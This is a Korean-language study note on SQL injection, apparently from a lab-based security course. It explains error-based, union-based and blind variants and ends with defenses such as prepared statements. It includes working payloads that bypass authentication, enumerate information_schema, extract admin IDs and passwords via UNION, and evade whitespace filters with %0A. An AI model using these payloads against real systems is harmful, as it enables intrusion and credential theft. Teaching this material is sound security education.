# SQL Injection

 아래 구문·시나리오는 **진단 동의를 받은 실습 대상**에 대한 교육 기록이다. 범위 밖 시스템에 대한 적용은 불법이다.

---

## 개념

**SQL Injection(SQLi)**은 공격자가 입력값에 **악성 SQL 쿼리를 끼워 넣어**, 애플리케이션이 의도하지 않은 쿼리를 DB에 실행시키는 취약점이다. 
그 결과 **DB 정보 탈취·인증 우회·데이터 변조·때로는 서버 명령 실행**까지 이어진다.

### 왜 생기나
- 사용자 입력이 **쿼리 문자열에 그대로 이어붙여(string concatenation)** 실행되기 때문.
- 예: `"SELECT * FROM users WHERE id='" + 입력 + "'"` → 입력에 `'`를 넣으면 쿼리 구조가 깨진다.

### 유형 분류
| 유형 | 설명 |
|---|---|
| **Error-based** | DB 에러 메시지에 정보가 노출되는 걸 이용 |
| **Union-based** | `UNION SELECT`로 다른 테이블 데이터를 결과에 끌어옴 |
| **Boolean-blind** | 참/거짓 응답 차이로 1비트씩 추론 (에러·데이터 노출 없음) |
| **Time-blind** | `SLEEP()` 등 **응답 지연**으로 참/거짓 판별 |

---

## 1. 점검 방법 — Single Quote(`'`) 테스트

가장 기본: **입력값을 넘기는 모든 지점에 `'`(싱글 쿼트) 하나를 입력**해본다.
- 에러가 나거나 동작이 달라지면 → **입력이 쿼리에 그대로 들어간다**는 신호 = SQLi 의심.

소스코드 예시:

![](../Images/Pasted%20image%2020261021151319.png)

### 인증 우회 / 컬럼 탐색 예시
```sql
' HAVING 1=1 --
```
→ `GROUP BY`/`HAVING` 에러를 유도해 **쿼리가 참조하는 컬럼명**(num, user_id, passwd)을 알아낸다.

> **`--` 의 의미:** SQL **주석**. 뒤에 남은 원본 쿼리(닫는 따옴표 등)를 무력화해 구문을 성립시킨다. (MySQL은 `-- ` 또는 `#`)

---

## 2. 데이터 추출 — 서브쿼리 / `IN` 활용

`IN (서브쿼리)` 로 다른 테이블 값을 에러/결과에 끌어내는 방식:

```sql
' or 1 in (select user_id from Members where user_id > 0) --
' or 1 in (select passwd from Members where passwd > 0) --
```


![](../Images/Pasted%20image%2020261021164341.png)


![](../Images/Pasted%20image%2020261021164324.png)


>  `1 in (select ...)` 는 서브쿼리 결과가 숫자 `1`과 타입이 안 맞으면 **에러 메시지에 그 값을 노출**시키는 트릭(Error-based). `user_id > 0` 같은 조건으로 행을 하나씩 흘려보낸다.

---

## 3. 꼭 알아야 하는 시스템 테이블/컬럼

진단의 핵심은 **"DB에 어떤 테이블·컬럼이 있는지"**를 알아내는 것. 이때 DBMS가 제공하는 **메타데이터(시스템) 테이블**을 조회한다.


### MS-SQL
| 객체 | 의미 | 이름 컬럼 |
|---|---|---|
| `sysobjects` | **테이블 정보**가 담긴 테이블 | `name` |
| `syscolumns` | **컬럼 정보**가 담긴 테이블 | `name` |


```sql
select name from sysobjects   -- 테이블 이름 목록
```


### 표준 (MySQL / MS-SQL 공통) — `information_schema`

| 객체 | 의미 |
|---|---|
| `information_schema.tables` | 테이블 정보 |
| `information_schema.columns` | 컬럼 정보 |


```sql
' union select 1,2,3,4,column_name from information_schema.columns where table_name='members' --
```

## 4. UNION 기반 추출

`UNION SELECT`는 **앞 쿼리와 컬럼 개수·타입이 정확히 일치**해야 성립한다. 그래서 먼저 **컬럼 개수를 알아내고**(NULL 채우기 / `ORDER BY n`), 출력되는 위치에 원하는 값을 넣는다.


```sql
' union select 1,2,3,adminid,adminpwd from admin_db --
' union select 1,2,3,4,5,6,adminid,adminpwd from admin_tb --
```


### 공백 필터 우회 (중요 트릭)

```sql
' union %0A select 1,2,3,4,5,6,adminid,adminpwd from admin_tb --
```


![](../Images/Pasted%20image%2020261022113428.png)

- 위 구문으로 시도했으나 **구문 오류**가 났다 → **공백 처리(필터링)**가 제대로 안 먹은 것으로 추측.
- `%0A`(줄바꿈), `%09`(탭), `/**/`(주석) 등으로 **공백을 대체**해 필터를 우회한다. 컬럼 개수를 맞춰가며(size 조정) 재시도.

## 5. Blind SQL Injection (예고)

- **무조건 참인 쿼리**와 **무조건 거짓인 쿼리**를 넣어, **웹 서비스의 반응 차이**(응답 내용·길이·시간)를 기반으로 데이터를 **한 비트/한 글자씩 추론**하는 공격.
- 에러도, 데이터도 화면에 안 나올 때 쓰는 기법. → 자동화 실습은 **`Blind SQL Injection 자동화.md`** 참고.

##  방어 대책 

| 대책                                           | 설명                                                     |
| -------------------------------------------- | ------------------------------------------------------ |
| **Prepared Statement (Parameterized Query)** | 근본 해결책. 쿼리 구조와 데이터를 **분리**해 입력이 코드로 해석되지 않게 함          |
| **입력값 검증/필터링**                               | 화이트리스트 기반 검증 (타입·길이·형식). 단, 필터링 단독은 우회 가능 → 보조책        |
| **최소 권한 DB 계정**                              | 웹앱 DB 계정에 `information_schema`·시스템테이블 접근, DROP/파일권한 제거 |
| **에러 메시지 숨김**                                | 상세 DB 에러를 사용자에게 노출 금지 (Error-based 차단)                 |
| **WAF**                                      | 알려진 SQLi 패턴 탐지·차단 (심층방어의 한 겹, 단독 의존 금지)                |
|                                              |                                                        |

> **요약:** SQLi의 뿌리는 **"입력을 쿼리 문자열에 그대로 붙이는 것"**이다. **Prepared Statement**로 구조와 데이터를 분리하는 게 유일한 근본 해결이고, 나머지(필터·WAF·최소권한)는 심층방어다.
